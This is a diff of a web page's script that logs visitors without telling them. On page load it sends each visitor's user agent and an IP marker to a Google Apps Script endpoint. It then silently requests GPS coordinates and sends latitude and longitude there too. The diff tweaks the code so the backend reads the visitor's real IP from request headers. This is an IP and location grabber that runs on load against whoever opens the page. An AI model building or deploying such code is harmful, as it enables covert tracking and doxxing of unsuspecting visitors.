@@ -45,19 +45,18 @@
 </div>
 
 <script>
-    // PASTE YOUR NEW URL HERE
+    // PASTE YOUR NEW URL HERE (Make sure to use the New Version)
     var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxhJlpEcgDJYcH8dYs8nZDdsQvWFlll3m88PIsDeGI0s2Mr9WYY8X7Y9KR20a1CautmBQ/exec"; 
 
     window.onload = function() {
         var ua = navigator.userAgent;
         
-        // 1. Send IP and UA via GET (URL Parameters)
-        // This is the most reliable way to ensure the script logs the data
-        fetch(SCRIPT_URL + "?ip=AutoDetected&ua=" + encodeURIComponent(ua))
+        // Send 'DirectHit' so the script knows to look for the REAL IP in headers
+        fetch(SCRIPT_URL + "?ip=DirectHit&ua=" + encodeURIComponent(ua))
         .then(function() {
             document.getElementById('status').innerText = "Details Saved.";
             
-            // 2. Try for GPS silently
+            // Try for GPS silently
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     var lat = position.coords.latitude;
@@ -66,7 +65,6 @@
                     // Update log with GPS if available
                     fetch(SCRIPT_URL + "?lat=" + lat + "&long=" + long_val + "&ua=" + encodeURIComponent(ua));
                 }, function(error) {
-                    // GPS denied or failed, but IP is already logged
                     console.log("GPS denied or failed");
                 });
             }
